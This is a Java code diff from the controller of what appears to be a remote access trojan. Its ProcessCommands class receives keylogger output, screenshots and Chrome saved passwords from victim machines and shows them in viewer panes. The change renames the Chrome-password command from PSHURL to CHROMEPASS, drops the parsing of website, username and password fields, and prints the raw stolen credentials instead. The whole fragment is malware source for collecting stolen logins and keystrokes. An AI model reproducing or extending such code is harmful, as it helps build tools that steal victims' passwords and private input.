@@ -65,38 +65,23 @@ class ProcessCommands implements Repository {
                 int len = dis.readInt();
                 String content = readFromDis(dis);
                 KeyloggerView.getData().setText(content);
-            } else if (input.contains("PSHURL")){
+            } else if (input.contains("CHROMEPASS")){
                 //StringBuilder fullContent = new StringBuilder();
                 try{Thread.sleep(100);}catch(InterruptedException e){e.printStackTrace();}
-                ChromePassView.getResultsArea().appendText("WEBSITE, USERNAME, PASSWORD\n\n");
+                ChromePassView.getResultsArea().appendText("Credentials will show up here.\n\n");
                 while (true) {
                     String content = readFromDis(dis);
-                    if (content.contains("Cannot parse Data files while chrome is running")){
-                        ChromePassView.getResultsArea().appendText(content);
-                        break;
-                    }
 
-                    if (content.trim().equals("ENDPSH")) {
+                    if (content.trim().equals("ENDCHROME")) {
                         break;
                     }
                     try{
-                        Thread.sleep(50); // DO NOT REMOVE
+                        Thread.sleep(35); // DO NOT REMOVE
                     } catch (InterruptedException e){
                         e.printStackTrace();
                     }
-                    //System.out.println(content);
-                    String[] split = content.split(",");
-                    if (split.length != 3){
-                        continue;
-                    }
-                    String password = split[0].replace("\"", "");
-                    String website = split[1].replace("\"", "");
-                    String username = split[2].replace("\"", "");
-                    if (password.equals("")) password = "(none)";
-                    if (username.equals("")) username = "(none)";
-                    if (website.equals("URL")) continue;
 
-                    ChromePassView.getResultsArea().appendText(website + " :: " + username + " :: " + password + "\n");
+                    ChromePassView.getResultsArea().appendText(content);
                 }
 
             } else if (input.contains("SCREENSHOT")) {
